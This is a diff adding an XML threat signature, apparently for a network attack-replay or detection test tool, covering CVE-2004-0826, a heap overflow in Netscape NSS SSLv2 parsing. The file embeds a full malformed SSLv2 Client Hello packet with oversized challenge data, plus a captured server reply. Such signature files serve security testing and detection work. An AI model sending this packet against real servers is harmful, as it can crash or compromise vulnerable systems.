@@ -1,0 +1,121 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Netscape NSS Library SSLv2 Record Parsing Buffer Overflow"/>
+    <EngDesc display="true" value="A vulnerability exists in Netscape Network Security Services (NSS) library&amp;apos;s SSLv2 message parsing routines. A malformed Client Hello message with excessively large Challenge Data could overwrite a memory buffer allocated on the heap. It is possible to perform attacks, without valid credentials, on a vulnerable web server with SSLv2 support enabled that would result in a denial of service or remote code execution."/>
+    <Intent display="true"/>
+    <Protocol display="true" value="HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Netscape"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Netscape_Netscape_NSS_library"/>
+      <item value="Netscape_Netscape_Enterprise_Webserver"/>
+      <item value="Netscape_Netscape_Personalization_Engine_(NPE)"/>
+      <item value="Netscape_Netscape_Directory_Server_(NDS)"/>
+      <item value="Netscape_Netscape_Certificate_Management_Server_(CMS)"/>
+      <item value="Netscape_Netscape_Sun_One/iPlanet"/>
+      <item value="Netscape_Netscape_Sun_ONE_Directory_Proxy_Server"/>
+      <item value="Netscape_Netscape_Sun_ONE_Certificate_Server"/>
+      <item value="Netscape_Netscape_Sun_ONE_Portal_Server"/>
+      <item value="Netscape_Netscape_Sun_ONE_Messaging_Server"/>
+      <item value="Netscape_Netscape_Sun_ONE_Application_Server"/>
+      <item value="Netscape_Netscape_SourceOffsite_Collaborative_Edition"/>
+      <item value="Netscape_Netscape_Debian_Linux"/>
+      <item value="Netscape_Netscape_Fedora_Core"/>
+      <item value="Netscape_Netscape_FreeBSD_"/>
+      <item value="Netscape_Netscape_Red_Hat_Linux"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Netscape_NSS_library_3.9.1_and_earlier"/>
+      <item value="Netscape_Enterprise_Webserver_"/>
+      <item value="Netscape_Personalization_Engine_(NPE)_"/>
+      <item value="Netscape_Directory_Server_(NDS)_"/>
+      <item value="Netscape_Certificate_Management_Server_(CMS)_"/>
+      <item value="Netscape_Sun_One/iPlanet_"/>
+      <item value="Netscape_Sun_ONE_Directory_Proxy_Server_"/>
+      <item value="Netscape_Sun_ONE_Certificate_Server_"/>
+      <item value="Netscape_Sun_ONE_Portal_Server_"/>
+      <item value="Netscape_Sun_ONE_Messaging_Server_"/>
+      <item value="Netscape_Sun_ONE_Application_Server_"/>
+      <item value="Netscape_SourceOffsite_Collaborative_Edition_"/>
+      <item value="Netscape_Debian_Linux_3.0"/>
+      <item value="Netscape_Fedora_Core_1"/>
+      <item value="Netscape_Fedora_Core_2"/>
+      <item value="Netscape_FreeBSD__4"/>
+      <item value="Netscape_FreeBSD__4.9"/>
+      <item value="Netscape_FreeBSD__4.10"/>
+      <item value="Netscape_FreeBSD__5.0"/>
+      <item value="Netscape_FreeBSD__5.1"/>
+      <item value="Netscape_FreeBSD__5.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20040823-02"/>
+    <CVEID display="true" value="CVE-2004-0826"/>
+    <bugtraqID display="true" value="11015"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="cf1847be61942c84396dbe40e0642504"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633603582743281250"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1213652360" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="J"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="K"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="L"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="M"/>
+    <NamedVar name="HTTPSdestPort" type="ImperfectControls.Port" value="null" index="N"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="J"/>
+      <for index="K"/>
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="E"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="043F" Identification="17A9" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="0106" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPSdestPort" SeqNumber="44F78382" AckNumber="2BD1D9BF" HeaderLength="08" WindowSize="16D0" Checksum="4733" UrgentPointer="0000" Options="0101080A05EB942700000000" Payload="840901000200000000040041414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="E" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0461" Identification="84F4" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="5398" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="2BD1D9BF" AckNumber="44F7878D" HeaderLength="08" WindowSize="4065" Checksum="027E" UrgentPointer="0000" Options="0101080A00029A6C05EB9427" Payload="842B040001000203FE00120010308203FA308202E2A003020102020102300D06092A864886F70D010104050030818A310B30090603550406130243413110300E060355040813074F6E746172696F3110300E06035504071307546F726F6E746F310C300A060355040A1303465343310C300A060355040B13035652543111300F06035504031308326B7365727665723128302606092A864886F70D01090116196473686E617964657240667363696E7465726E65742E636F6D301E170D3034303832343030303234395A170D3036303832343030303234395A3060310B30090603550406130243413110300E060355040813074F6E746172696F3110300E06035504071307546F726F6E746F310C300A060355040A1303465343310C300A060355040B13035652543111300F06035504031308326B73657276657230819F300D06092A864886F70D010101050003818D0030818902818100B7BCF59EBBDB94C724F71368B5AEA4A630AEDCEA5BED3C644542B59F0C8FD3BD212269BA477B11A0DD2FD4132974F2C1B28371A22ACB5C9FEAA3F376D007B45882D41D7BE318FF6A61DCBE3056E221F82B38885CA6F3E3696105897733F5D38EF6C69008C950782DB9BE55026E72FB434DAF3138C110FF8E4BBFAE1FA0E6339F0203010001A38201163082011230090603551D1304023000302C06096086480186F842010D041F161D4F70656E53534C2047656E657261746564204365727469666963617465301D0603551D0E04160414370BA36DCACB628488477E446F1F960F1486278A3081B70603551D230481AF3081AC8014863EEFB46415AFF57D7CE2B308B8786D8432AE28A18190A4818D30818A310B30090603550406130243413110300E060355040813074F6E746172696F3110300E06035504071307546F726F6E746F310C300A060355040A1303465343310C300A060355040B13035652543111300F06035504031308326B7365727665723128302606092A864886F70D01090116196473686E617964657240667363696E7465726E65742E636F6D820100300D06092A864886F70D010104050003820101007E05C0670692589C4F6483DA4F2006F96787A1B00117A13B6EBF73E2F3A1BB3F2FB359A7496C54CC79CC1EC7A7D171C1A1D47E70A47FE0AEA7BB9BE86BB4A652F19E2CAABA3D6E00ECFE9723D48DB1794BBB20110B6C147F0AA377DB834FAC9D952441841371A5B1DC9A14B1CE66643A3C58466C7474F89B0210762A2FB8D5092F862E5049CF20559E96AD575AB0BB4273DA3E6F3FE91626FE9275E8D590C2A62ED66C138DC8354BBCEA040B57636F6C5AC71D0CFA6BF585F28F05D4904936C4A298E711D4C6FBBA36B470CAFB82BDE1819AD983FB86B06C8ED3391580CD49E60DA819D3864E8C73FF9FF068B9ED81B623991C524AE8D36896C2D712273E5E880100800700C003008006004002008004008041414141414141414141414141414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
